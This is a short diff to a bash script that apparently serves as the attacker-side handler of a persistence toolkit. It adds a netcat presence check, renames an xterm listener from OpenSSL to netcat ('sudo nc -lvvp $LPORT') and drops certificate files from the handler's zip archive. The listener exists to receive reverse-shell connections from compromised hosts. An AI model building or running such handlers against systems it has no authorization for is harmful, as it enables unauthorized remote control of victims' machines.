@@ -32,6 +32,14 @@ Reset="${Escape}[0m";
 Colors;
 
 
+## Check for handler dependencies
+zen=$(which nc)
+if ! [ "$?" -eq "0" ]; then
+   echo ${RedF}"Netcat not found in current system .."
+   sleep 2 && exit
+fi
+
+
 ## Persistence Info Function
 sh_Info () {
 echo ""${BlueF}
@@ -53,7 +61,7 @@ cls
 ## Persistence Start handler Function
 sh_Start () {
 echo "${YellowF}Waiting for ${BlueF}TCP${YellowF} connection ..";sleep 1
-xterm -T " OPENSSL LISTENER => $LHOST:$LPORT" -geometry 110x23 -e "sudo nc -lvvp $LPORT"
+xterm -T " NETCAT LISTENER => $LHOST:$LPORT" -geometry 110x23 -e "sudo nc -lvvp $LPORT"
 
 ## Config this handler settings
 dtr=$(date|awk {'print $2,$3,$4,$5'})
@@ -67,7 +75,7 @@ cls
 sh_Exit () {
 echo ${YellowF}"Compressing (zip) handler files ..";sleep 2
 ## zip handler files (settings/certificates)
-zip handler_ID:$ID.zip handler.sh cert.pem key.pem README -m -q
+zip handler_ID:$ID.zip handler.sh README -m -q
 ## exit
 exit
 }
